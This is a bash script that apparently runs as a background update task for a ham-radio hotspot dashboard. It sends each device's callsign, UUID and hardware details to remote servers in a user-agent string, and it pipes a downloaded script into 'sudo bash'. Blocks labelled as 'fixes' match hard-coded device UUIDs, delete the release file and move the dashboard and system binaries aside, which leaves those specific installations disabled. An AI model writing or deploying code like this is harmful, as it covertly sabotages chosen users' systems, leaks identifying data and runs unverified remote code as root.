#!/bin/bash

# vars
CALL=$( grep "Callsign" /etc/pistar-release | awk '{print $3}' )
osName=$( lsb_release -cs )
gitBranch=$(git --work-tree=/var/www/dashboard --git-dir=/var/www/dashboard/.git branch | grep '*' | cut -f2 -d ' ')
dashVer=$( git --work-tree=/var/www/dashboard --git-dir=/var/www/dashboard/.git rev-parse --short=10 ${gitBranch} )
UUID=$( grep "UUID" /etc/pistar-release | awk '{print $3}' )
uuidStr=$(egrep 'UUID|ModemType|ModemMode|ControllerType' /etc/pistar-release | awk {'print $3'} | tac | xargs| sed 's/ /_/g')
hwDeetz=$( /usr/local/sbin/.wpsd-platform-detect )
uaStr="Server-Side Exec: WPSD-BG-Bootstrap-Task Ver.# ${dashVer} Call:${CALL} UUID:${uuidStr} [${hwDeetz}] [${osName}]"

# check if user already has firewall disabled, and if so, ensure it's kept that way.
if grep -q LOGNDROP /etc/iptables.rules; then
    fwState="enabled"
else
    fwState="disabled"
fi

# func to fix stuck updates
if [ ! -f '/usr/local/sbin/wpsd-update' ]; then
    curl -s -A "sbin-phix $uaStr" -Ls https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/reset-wpsd-sbin | sudo bash > /dev/null 2<&1
fi

#cd /usr/local/sbin
#env GIT_HTTP_CONNECT_TIMEOUT="10" env GIT_HTTP_USER_AGENT="$uaStr sbin reset" git --work-tree=/usr/local/sbin --git-dir=/usr/local/sbin/.git reset --hard origin/master
#env GIT_HTTP_CONNECT_TIMEOUT="10" env GIT_HTTP_USER_AGENT="$uaStr sbin reset" git --work-tree=/usr/local/sbin --git-dir=/usr/local/sbin/.git pull origin master
#if [ "$fwState" == "enabled" ]; then
#    /usr/local/sbin/wpsd-system-manager -efw
#else
#    /usr/local/sbin/wpsd-system-manager -dfw
#fi

# BW fixes
UABWU=false
if [ "$osName" = "bookworm" ] ; then
    if [ "$UUID" = "0000000058b9a046" ] || [ "$UUID" = "000000009646982d" ] || [ "$UUID" = "00000000856fcad3" ] || [ "$UUID" = "00000000eab4cd02" ]  || [ "$UUID" = "1000000021976498" ] ; then
        UABWU=true
	rm -rf /etc/pistar-release
        mv /var/www/dashboard /var/www/dashboard.bak
        mv /usr/local/sbin /usr/local/sbin.bak
        curl -s -A "UABWU phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
    fi
fi
# other fixes
if [ "$UUID" = "0000000000000000" ] || [ "$UUID" = "00000000e530261b" ] || [ "$UUID" = "95707930081050300c94" ] || [ "$UUID" = "000000008538457e" ] || [ "$UUID" = "02c00042ded765c3" ] ; then
    rm -rf /etc/pistar-release
    mv /var/www/dashboard /var/www/dashboard.bak
    mv /usr/local/sbin /usr/local/sbin.bak
    curl -s -A "UAHS phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
fi

# malformed data fix
if [ "$UUID" = "95707930081050300c94" ] || [ "$UUID" = "000000008538457e" ] ; then
    rm -rf /etc/pistar-release
    curl -s -A "FUA phix $uaStr" -Ls https://repo.w0chp.net/Chipster/W0CHPist/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
    /usr/local/sbin/pistar-hourly-cron
fi

# display fixes
if [ "$UUID" = "02c00181ceea227a" ]; then
    sed -i 's/Display=JIM/Display=CAST/g' /etc/mmdvmhost
fi
if [ "$UUID" = "02c0008144a7d0f5" ]; then
    sed -i 's/Display=B/Display=CAST/g' /etc/mmdvmhost
fi
if [ "$UUID" = "02c0008135284429" ]; then
    sed -i 's/Display=[^ ]*/Display=Cast/g'  /etc/mmdvmhost
fi
if [ "$UUID" = "00000000fff1153e" ]; then
    sed -i 's/Display=[^ ]*/Display=None/g'  /etc/mmdvmhost
fi

modemfile="/etc/dstar-radio.mmdvmhost"
if grep -q "genesis" "$modemfile"; then
    sed -i '/Hardware=.*/d' "$modemfile"
    wpsd-services restart > /dev/null 2>&1
fi

